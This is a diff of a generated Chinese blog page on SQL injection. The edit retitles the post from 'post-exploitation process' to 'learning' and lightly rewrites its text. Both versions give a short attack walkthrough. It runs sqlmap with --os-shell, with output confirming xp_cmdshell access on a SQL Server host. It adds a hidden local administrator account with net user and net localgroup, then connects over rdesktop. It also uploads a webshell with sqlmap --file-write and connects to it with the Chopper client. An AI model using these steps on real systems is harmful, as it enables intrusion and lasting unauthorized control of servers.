@@ -81,14 +81,14 @@
 
 <meta name="keywords" content="sqli">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL 注入后渗透流程">
+<meta property="og:title" content="SQL 注入学习">
 <meta property="og:url" content="https://0x43434343.com/2016/05/01/201605011356/index.html">
 <meta property="og:site_name" content="fenix&#39;s blog">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/sql-injection-access-to-system-privileges/ace5d25804b2af0e9365175b7a0306a1185606e6">
-<meta property="og:updated_time" content="2021-06-11T03:30:47.414Z">
+<meta property="og:updated_time" content="2021-06-11T06:19:13.625Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL 注入后渗透流程">
+<meta name="twitter:title" content="SQL 注入学习">
 <meta name="twitter:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/sql-injection-access-to-system-privileges/ace5d25804b2af0e9365175b7a0306a1185606e6">
 
 
@@ -125,7 +125,7 @@
 
 
 
-  <title>SQL 注入后渗透流程 | fenix's blog</title>
+  <title>SQL 注入学习 | fenix's blog</title>
   
 
 
@@ -323,7 +323,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL 注入后渗透流程</h1>
+          <h1 class="post-title" itemprop="name headline">SQL 注入学习</h1>
         
 
         <div class="post-meta">
@@ -389,7 +389,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  304
+                  287
                 </span>
               
 
@@ -429,15 +429,17 @@
         <p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/sql-injection-access-to-system-privileges/ace5d25804b2af0e9365175b7a0306a1185606e6" alt=""></p>
 <a id="more"></a>
 <blockquote>
-<p>关于 SQL inject 后渗透流程。</p>
+<p>关于 SQL inject 流程。</p>
 </blockquote>
-<h1 id="确认目标"><a href="#确认目标" class="headerlink" title="确认目标"></a>确认目标</h1><p>或手动或工具扫描， 寻找存在 sql 注入漏洞的站点。</p>
+<h1 id="确认目标"><a href="#确认目标" class="headerlink" title="确认目标"></a>确认目标</h1><p>手动或使用工具探测，寻找存在漏洞的目标。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u <span class="string">"site url"</span> --os-shell</span><br><span class="line">[14:05:17] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2008</span><br><span class="line">[14:05:17] [INFO] testing <span class="keyword">if</span> current user is DBA</span><br><span class="line">[14:05:17] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[14:05:17] [INFO] testing <span class="keyword">if</span> xp_cmdshell extended procedure is usable</span><br><span class="line">[14:05:18] [INFO] the SQL query used returns 1 entries</span><br><span class="line">[14:05:18] [INFO] xp_cmdshell extended procedure is usable</span><br></pre></td></tr></table></figure>
-<h1 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h1><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p><code>xm_cmdshell</code> 扩展存储过程可用，数据库用户是 <code>DBA</code>, 直接上 <code>--os-shell</code>，然后用以下命令添加临时账户。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user 账户 密码 /add             # 添加用户</span><br><span class="line">net localgroup administrator 账户 /add                  # 添加用户到管理员组</span><br></pre></td></tr></table></figure>
-<p>然后用 <code>rdesktop</code> 远程连接即可。记得退出桌面连接后运行 <code>net user 账户 /del</code> 删除添加的用户<br>如果远程连接提示当前连接数超限。可做如下 处理</p>
+<h2 id="xm-cmdshell"><a href="#xm-cmdshell" class="headerlink" title="xm_cmdshell"></a>xm_cmdshell</h2><p><code>xm_cmdshell</code> 扩展存储过程可用，数据库用户是 <code>DBA</code>，直接使用 <code>--os-shell</code>，然后用以下命令添加临时账户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add        # 添加用户</span><br><span class="line">net localgroup administrator username /add       # 添加用户到管理员组</span><br></pre></td></tr></table></figure>
+<p>然后用 <code>rdesktop</code> 远程连接即可，记得退出桌面连接后运行 <code>net user username /del</code> 删除添加的用户。</p>
+<p>如果远程连接提示当前连接数超限。可做如下处理</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br><span class="line">logoff userID</span><br></pre></td></tr></table></figure>
-<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>探测Web目录， 然后上传 <code>webshell</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;site url&quot; --file-write  localWebshellPath  --file-dest remotePath -v 2</span><br></pre></td></tr></table></figure></p>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>探测 Web 目录， 然后上传 <code>webshell</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u <span class="string">"site url"</span> --file-write localWebshellPath --file-dest remotePath -v 2</span><br></pre></td></tr></table></figure>
 <p>之后利用中国菜刀连接。</p>
 
       
@@ -465,12 +467,12 @@
 
         <li class="post-copyright-link">
           <strong>本文标题：</strong>
-          <a href="https://0x43434343.com/2016/05/01/201605011356/" title="SQL 注入后渗透流程">SQL 注入后渗透流程</a>
+          <a href="https://0x43434343.com/2016/05/01/201605011356/" title="SQL 注入学习">SQL 注入学习</a>
         </li>
 
         <li class="post-copyright-link">
           <strong>本文链接：</strong>
-          <a href="https://0x43434343.com/2016/05/01/201605011356/" title="SQL 注入后渗透流程">https://0x43434343.com/2016/05/01/201605011356/</a>
+          <a href="https://0x43434343.com/2016/05/01/201605011356/" title="SQL 注入学习">https://0x43434343.com/2016/05/01/201605011356/</a>
         </li>
 
         <li class="post-copyright-date">
@@ -502,8 +504,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/04/06/201604061251/" rel="next" title="修复系统 Grub">
-                <i class="fa fa-chevron-left"></i> 修复系统 Grub
+              <a href="/2016/03/06/201603061408/" rel="next" title="加速 sbt 的依赖包下载">
+                <i class="fa fa-chevron-left"></i> 加速 sbt 的依赖包下载
               </a>
             
           </div>
@@ -606,7 +608,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">35</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -628,7 +630,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -677,7 +679,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#确认目标"><span class="nav-number">1.</span> <span class="nav-text">确认目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进一步渗透"><span class="nav-number">2.</span> <span class="nav-text">进一步渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路一"><span class="nav-number">2.1.</span> <span class="nav-text">思路一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路二"><span class="nav-number">2.2.</span> <span class="nav-text">思路二</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#确认目标"><span class="nav-number">1.</span> <span class="nav-text">确认目标</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xm-cmdshell"><span class="nav-number">1.1.</span> <span class="nav-text">xm_cmdshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell"><span class="nav-number">1.2.</span> <span class="nav-text">webshell</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -711,7 +713,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">88.1k</span>
+    <span title="Site words total count">84.2k</span>
   
 </div>
 
@@ -858,7 +860,7 @@
         var disqus_config = function () {
           this.page.url = 'https://0x43434343.com/2016/05/01/201605011356/';
           this.page.identifier = '2016/05/01/201605011356/';
-          this.page.title = 'SQL 注入后渗透流程';
+          this.page.title = 'SQL 注入学习';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://fenixns.disqus.com/embed.js';
